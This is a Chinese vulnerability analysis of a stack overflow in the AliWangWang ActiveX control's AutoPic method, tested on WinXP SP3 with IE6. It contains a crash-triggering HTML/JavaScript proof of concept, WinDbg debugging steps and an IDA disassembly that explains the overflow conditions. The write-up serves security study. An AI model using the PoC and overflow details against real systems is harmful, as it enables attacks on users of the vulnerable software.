
# 阿里旺旺AtiveX控件栈溢出漏洞分析

该漏洞是我在漏洞战争一书中看到的，书中对该漏洞的描述相对较少，并且作者有意将该漏洞的溢出原理及利用代码写错，所以我为此漏洞写了这篇文章来方便大家参考。

以下为作者提供的poc代码，首先构造了一个超长的缓冲区,之后调用AtiveX对象的`AutoPic`方法，并将缓冲区传入发生溢出，程序崩溃。

```html
<object classid="clsid:128D0E38-1FF4-47C3-B0F7-0BAF90F568BF"id="target"></object>
<script>
var buffer = '';
while (buffer.length < 1111) buffer+="A";
target.AutoPic(buffer,"defaultV");
</script>
```

## 定位缓冲区所在函数

我对常见的栈溢出，使用poc文件触发崩溃的情景，做一下总结，将其分成的4种情况：

1. 被溢出缓冲区所在的函数中，因缓冲区溢出修改了位于缓冲区高地址的变量，导致未能执行到函数返回就触发异常，这种情况异常一定位于位于缓冲区溢出后，但可能位于缓冲区所在的函数，也可能位于将被修改的局部变量作为参数的其他函数中，这种情况我们可以通过查看栈回溯和栈所在内存，找到被破坏的栈帧的栈顶所保存的返回地址，来定位缓冲区所在的函数，如果当前栈帧就是被破环的栈帧，那么当前地址所在函数就是缓冲区所在函数。
2. 程序在调用被溢出缓冲区所在函数时，传递了之前函数栈帧的局部变量指针，并在溢出后使用了该指针指向的变量引发崩溃的情况，原因是缓冲区溢出的数据覆盖到参数指针引用到的局部变量，这种情况我们依然可以通过查看栈回溯和栈所在内存，找到被破坏的栈帧的栈顶所保存的返回地址，来定位缓冲区所在的函数。
3. 触发内存访问异常`c0000005`，例如漏洞的栈溢出没有限制，我们可以溢出大量的数据，直至到达栈所映射内存页的末尾，触发内存访问异常，这种情况触发异常的代码就是溢出点，我们可以也通过查看栈回溯和栈所在内存，找到缓冲区所在函数。
4. 程序已经跳转到我们写入数据所对应的地址，此时我们只需要定位偏移位置，就可以进一步实现漏洞利用，但是如果我们要分析漏洞的话，就需要找到缓冲区所在函数，我们可以通过查看缓冲区所在函数最后一个函数调用的返回地址来定位，具体就是查看`sp`寄存器指向地址，向低地址方向的内存，查找4/8字节类似返回地址的数据。

以上只是些常见情况的简单总结，在实际遇到的问题中更多的是具体问题具体解决。

现在来看要分析的漏洞，我所实验的环境为`winxp sp3`虚拟机+`IE6`的浏览器，以下为实验过程

### I.打开IE6，并使用windbg附加进程并运行，拖拽打开poc.html,程序崩溃

当前情况正好符合我们总结的第3种情况，我们可以通过栈回溯找到缓冲区所在的函数，位于`ImageMan`模块，通过向低地址反汇编我们找到函数的首地址为`0x1001ab7f`,所在模块信息：

`Dll Start    End SafeSEH ASLR`

`ImageMan 0x10000000  0x10054000     true         false`

### II.因为该漏洞的溢出原理相对比较简单，所以我这里直接从缓冲区溢出函数开始分析，重新打开IE6， windbg附加进程。

因为`ImageMan`是动态加载的，所以不能直接对该地址下断点，有两种方式解决：

一． 是在`dll`加载后对`0x1001ab7f`地址下断点

附加程序后，执行`sex ld:ImageMan` 命令并运行，会在加载`ImageMan`模块后断下，再对`0x1001ab7`地址下断点

二． 是使用硬件执行断点

我在使用第一种方法时，程序还未执行到漏洞函数，便在`gdiplus`模块中崩溃，通过测试查找问题原因发现这并不是漏洞引发的原因(我将触发漏洞的代码注释掉，还是在`gdiplus`模块中崩溃)，我推测是`windbg`执行完`sex ld:ImageMan`后引发的问题，暂时忽略这个问题，使用第二个方法进行调试

成功断到漏洞函数，根据`IDA`对该函数的分析得知，该函数有3个参数，第二个参数为我们在`js`中调用`target.AutoPic(buffer,"defaultV");`传入的`buffer`(`AAAAA…`)，可以得出结论，`AutoPic`简介调用漏洞函数，并将构造的输入传入漏洞函数，触发漏洞

### 栈溢出原理分析

根据分析，漏洞函数做了以下事情：

```c
int __stdcall vulnFun(int arg1, LPCWSTR lpBuffer, int arg3)
{
char strPath[0x104] = { 0 };
char targetPath[0x104] = { 0 };
char *endPtr;
//该函数不是字符串操作函数只负责将lpBuffer转换为ascii码保存到strPath中并保证不超过strPath缓冲区的大小，
//但并不会为strPath添加'\0'结束符
WideCharToMultiByte(0, 0, lpBuffer, -1, strPath, 0x104, 0, 0);
//该函数查找字符串中最后一个'\'符的地址，没有找到则返回NULL
endPtr = strrchr(strPath, '\\') ;
// 该函数在拷贝字符串时，当拷贝足够字符串长度,或遇到'\0'字符串结尾结束拷贝
strncpy(targetPath, strPath, endPtr - strPath + 1);
......
}
```

`srcPath`的长度为`0x104`，而`lpBuffer`为我们输入的数据的长度，远超`0x104`，所以当执行完`WideCharToMultiByte`函数后， `strPath`末尾没有`0`结束符，j将全部填充为我们输入的数据的前`0x104`个字符

还有一个需要注意的事情就是，`targetPath`与`srcPath`的地址是连续的，`targetPath`在`srcPath`的高地址，刚开始两个数组都被初始化为全`0`，所以`strPath`可以作为一个以`targetPath`第一个元素为结尾的字符串，长度为`0x104`，所以之后执行`strrch`函数并没有发生什么问题，由于我们输入的数据没有包含`\`符号，所以函数返回`0`，并赋值给`endPtr`

之后通过`(endPtr-strPath)+1`来计算要拷贝的数据大小，这时`endPtr`为`0`，结果为负数，也是一个很大的正整数，`0xffed2141`如下图：

接下来通过`strncpy`，进行拷贝，拷贝长度为`0xffed2141`，从`strPath`,拷贝到`targetPath`。这时候就有问题了，`strncpy`函数当拷贝足够字符串长度,或遇到`'\0'`字符串结尾结束拷贝，最大长度是达不到的，`'\0'`也是达不到的。如图：

本来`strPath`可以以`targetPath`第一个元素为字符串结尾，现在永远也拷不到结尾了，所以触发了内存访问冲突异常。

总结溢出条件：

当输入数据长度大于等于`0x104`, 并且不包含`'\'`字符就会发生溢出。

以下为`IDA`分析后的代码：

```asm
.text:1001AB7F ; int __stdcall vulnFun(int, LPCWSTR lpBuffer, int)
.text:1001AB7F vulnFun         proc near               ; DATA XREF: .rdata:1003ED5Co
.text:1001AB7F                                         ; .rdata:1003F1F0o
.text:1001AB7F
.text:1001AB7F var_31C         = dword ptr -31Ch
.text:1001AB7F var_318         = dword ptr -318h
.text:1001AB7F var_314         = byte ptr -314h
.text:1001AB7F MultiByteStr    = byte ptr -310h
.text:1001AB7F endPtr          = dword ptr -20Ch
.text:1001AB7F srcPath         = byte ptr -208h
.text:1001AB7F targetPath      = byte ptr -104h
.text:1001AB7F s               = dword ptr  0
.text:1001AB7F r               = dword ptr  4
.text:1001AB7F arg_0           = dword ptr  8
.text:1001AB7F lpBuffer        = dword ptr  0Ch
.text:1001AB7F arg_8           = dword ptr  10h
.text:1001AB7F
.text:1001AB7F                 push    ebp
.text:1001AB80                 mov     ebp, esp
.text:1001AB82                 sub     esp, 31Ch
.text:1001AB88                 push    edi             ; ------------------------
.text:1001AB89                 mov     [ebp+srcPath], 0
.text:1001AB90                 mov     ecx, 40h
.text:1001AB95                 xor     eax, eax
.text:1001AB97                 lea     edi, [ebp+srcPath+1]
.text:1001AB9D                 rep stosd
.text:1001AB9F                 stosw
.text:1001ABA1                 stosb                   ; char srcPath[0x104] = {0} ;
.text:1001ABA1                                         ; ---------------------------------
.text:1001ABA2                 push    0               ; lpUsedDefaultChar
.text:1001ABA4                 push    0               ; lpDefaultChar
.text:1001ABA6                 push    104h            ; cbMultiByte
.text:1001ABAB                 lea     eax, [ebp+srcPath]
.text:1001ABB1                 push    eax             ; lpMultiByteStr
.text:1001ABB2                 push    0FFFFFFFFh      ; cchWideChar
.text:1001ABB4                 mov     ecx, [ebp+lpBuffer]
.text:1001ABB7                 push    ecx             ; lpWideCharStr
.text:1001ABB8                 push    0               ; dwFlags
.text:1001ABBA                 push    0               ; CodePage
.text:1001ABBC                 call    ds:WideCharToMultiByte ; 该函数不是串操作函数，
.text:1001ABBC                                         ; 所以在转换结束后不会为目标字符串添加'\0'结束符号
.text:1001ABC2                 mov     [ebp+MultiByteStr], 0
.text:1001ABC9                 mov     ecx, 40h
.text:1001ABCE                 xor     eax, eax
.text:1001ABD0                 lea     edi, [ebp+MultiByteStr+1]
.text:1001ABD6                 rep stosd
.text:1001ABD8                 stosw
.text:1001ABDA                 stosb
.text:1001ABDB                 push    '\'             ; Ch
.text:1001ABDD                 lea     edx, [ebp+srcPath]
.text:1001ABE3                 push    edx             ; srcPath
.text:1001ABE4                 call    _strrchr        ; 获取字符串中最后一个'/'的地址,如果没有找到'/'则返回NULL(0)
.text:1001ABE9                 add     esp, 8
.text:1001ABEC                 mov     [ebp+endPtr], eax
.text:1001ABF2                 mov     [ebp+targetPath], 0
.text:1001ABF9                 mov     ecx, 40h
.text:1001ABFE                 xor     eax, eax
.text:1001AC00                 lea     edi, [ebp+targetPath+1]
.text:1001AC06                 rep stosd
```
